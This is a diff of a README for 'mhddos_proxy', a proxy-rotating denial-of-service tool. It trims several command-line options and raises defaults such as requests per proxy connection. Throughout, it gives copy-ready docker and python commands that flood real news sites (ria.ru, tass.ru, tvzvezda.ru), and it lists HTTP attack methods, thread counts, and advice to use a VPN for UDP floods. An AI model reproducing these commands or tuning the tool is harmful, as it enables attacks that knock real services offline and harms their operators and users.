@@ -78,10 +78,6 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
 
     docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --debug https://ria.ru https://tass.ru
 
-Отримати більше проксі (можливо, гіршої якості) - `--proxy-timeout SECONDS`
-
-    docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy --proxy-timeout 5 https://ria.ru https://tass.ru
-
 Змінити частоту оновлення проксі (за замовчуванням - кожні 10 хвилин) - `-p SECONDS`
 
     docker run -it --rm ghcr.io/porthole-ascend-cinnamon/mhddos_proxy -p 900 https://ria.ru https://tass.ru
@@ -101,9 +97,7 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
     usage: runner.py target [target ...]
                      [-t THREADS] 
                      [-p PERIOD]
-                     [--proxy-timeout TIMEOUT]
                      [--rpc RPC] 
-                     [--udp-threads UDP_THREADS]
                      [--debug]
                      [--http-methods METHOD [METHOD ...]]
 
@@ -114,15 +108,9 @@ UDP - **ТУТ ПОТРІБНО ВКЛЮЧИТИ VPN**
       -h, --help             show this help message and exit
       -c, --config URL       URL to a config file (list of targets in plain text)
       -t, --threads 300      Threads per CPU core (default is 300)
-      -p, --period 600       How often to update the proxies (default is 600)
-      --proxy-timeout 3      How many seconds to wait for the proxy to make a connection.
-                             Higher values give more proxies, but with lower speed/quality.
-                             Parsing also takes more time (default is 3)
-
+      -p, --period 900       How often to update the proxies (default is 900)
       --debug                Enable debug output from MHDDoS
-      --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
-      --udp-threads 1        Threads to run per UDP target (default is 1, change carefully)
-
+      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
                              Refer to MHDDoS docs for available options
@@ -185,9 +173,7 @@ Note that **python** is used instead of python3.
     usage: runner.py target [target ...]
                      [-t THREADS] 
                      [-p PERIOD]
-                     [--proxy-timeout TIMEOUT]
                      [--rpc RPC] 
-                     [--udp-threads UDP_THREADS]
                      [--debug]
                      [--http-methods METHOD [METHOD ...]]
 
@@ -198,15 +184,9 @@ Note that **python** is used instead of python3.
       -h, --help             show this help message and exit
       -t, --threads 300      Threads per CPU Core (default is 300)
       -c, --config URL       URL to a config file (list of targets in plain text)
-      -p, --period 300       How often to update the proxies (default is 600)
-      --proxy-timeout 3      How many seconds to wait for the proxy to make a connection.
-                             Higher values give more proxies, but with lower speed/quality.
-                             Parsing also takes more time (default is 3)
-
+      -p, --period 900       How often to update the proxies (default is 900)
       --debug                Enable debug output from MHDDoS
-      --rpc 1000             How many requests to send on a single proxy connection (default is 1000)
-      --udp-threads 1        Threads to run per UDP target (default is 1, change carefully)
-
+      --rpc 2000             How many requests to send on a single proxy connection (default is 2000)
       --http-methods GET     List of HTTP(s) attack methods to use.
                              (default is GET, POST, STRESS, BOT, PPS)
                              Refer to MHDDoS docs for available options
@@ -236,10 +216,6 @@ View DEBUG info (traffic)
 Change proxy update interval
 
     python3 runner.py -p 900 https://tvzvezda.ru
-
-Get more proxies (possibly lower quality)
-
-    python3 runner.py --proxy-timeout 5 https://tvzvezda.ru
 
 Specific HTTP(S) attack method(s)
 
